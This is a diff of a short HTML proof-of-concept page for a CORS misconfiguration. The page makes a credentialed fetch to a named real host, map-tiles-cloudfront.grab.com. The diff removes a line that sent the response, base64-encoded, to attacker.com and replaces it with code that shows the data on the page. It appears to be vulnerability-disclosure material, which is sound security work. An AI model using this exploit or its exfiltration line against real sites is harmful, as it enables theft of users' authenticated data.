@@ -1,13 +1,17 @@
 <!DOCTYPE html>
 <html>
   <body>
+    <h1>PoC CORS</h1>
     <script>
       fetch("https://map-tiles-cloudfront.grab.com", {
-        credentials: "include",
+        credentials: "include"
       })
       .then(res => res.text())
       .then(data => {
-        fetch("https://attacker.com/log?data=" + btoa(data));
+        document.body.innerHTML += "<pre>" + data + "</pre>";
+      })
+      .catch(err => {
+        document.body.innerHTML += "<p style='color:red'>" + err + "</p>";
       });
     </script>
   </body>
